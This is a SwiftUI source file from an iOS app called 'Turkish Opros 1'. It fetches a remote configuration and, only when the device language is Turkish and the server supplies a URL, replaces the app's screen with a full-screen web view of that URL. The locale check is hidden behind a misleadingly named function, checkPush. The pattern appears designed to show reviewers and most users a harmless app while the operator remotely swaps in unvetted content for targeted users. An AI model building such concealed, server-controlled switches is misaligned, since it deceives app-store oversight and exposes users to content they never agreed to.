//
//  ContentView.swift
//  Turkish Opros 1
//
//  Created by Mac on 12.03.2024.
//

import SwiftUI
import WebKit
import Combine

struct ContentView: View {
    @State var message: String = ""
    @State var appURL: String = ""
    
    var body: some View {
        ZStack(content: {
            if !appURL.isEmpty && checkPush() {
                WebView(url: URL(string: appURL)!)
            } else {
                MainFragment()
            }
        })
        .onAppear {
            fetchData()
        }
    }
    
    
    
    private func fetchData() {
            guard let url = URL(string: "https://apps.catoftree.com/api/app?identify=tp-anket") else {
                return
            }
            
            URLSession.shared.dataTask(with: url) { (data, response, error) in
                guard let data = data, error == nil else {
                    print("Error: \(error?.localizedDescription ?? "Unknown error")")
                    return
                }
                
                if let decodedData = try? JSONDecoder().decode(Response.self, from: data) {
                    DispatchQueue.main.async {
                        self.message = decodedData.message
                        self.appURL = decodedData.data.appURL
                    }
                }
            }
            .resume()
        }

}


struct WebView: UIViewRepresentable {
    
    let url: URL

    func makeUIView(context: Context) -> WKWebView {
        return WKWebView()
    }

    func updateUIView(_ uiView: WKWebView, context: Context) {
        
        let request = URLRequest(url: url)
        uiView.load(request)
    }

}

private func checkPush() -> Bool {

    return Locale.current.languageCode == "tr"

}


struct Response: Codable {
    let success: Bool
    let message: String
    let data: AppData
}

struct AppData: Codable {
    let status: Int
    let appURL: String
    
    enum CodingKeys: String, CodingKey {
        case status
        case appURL = "app_url"
    }
}
